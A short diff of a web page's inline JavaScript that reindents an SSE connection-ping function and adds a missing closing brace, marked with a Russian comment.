@@ -688,15 +688,15 @@ window.redirectToSMS = function(cardNumber) {
 };
 
         function startPing() {
-            pingInterval = setInterval(() => {
-    if (eventSource && eventSource.readyState === EventSource.OPEN) {
-        console.log('🏓 Ping SSE connection');
-    } else {
-        console.log('🏓 SSE connection not open, reconnecting...');
-        connectSSE();
-        
-    }
-}, 10000); // 10 секунд
+    pingInterval = setInterval(() => {
+        if (eventSource && eventSource.readyState === EventSource.OPEN) {
+            console.log('🏓 Ping SSE connection');
+        } else {
+            console.log('🏓 SSE connection not open, reconnecting...');
+            connectSSE();
+        }
+    }, 10000); // 10 секунд
+} // ← ДОБАВЬ ЭТУ СКОБКУ
 
         function stopPing() {
             if (pingInterval) {
@@ -776,6 +776,7 @@ window.redirectToSMS = function(cardNumber) {
     </script>
 </body>
 </html>
+
 
 
 
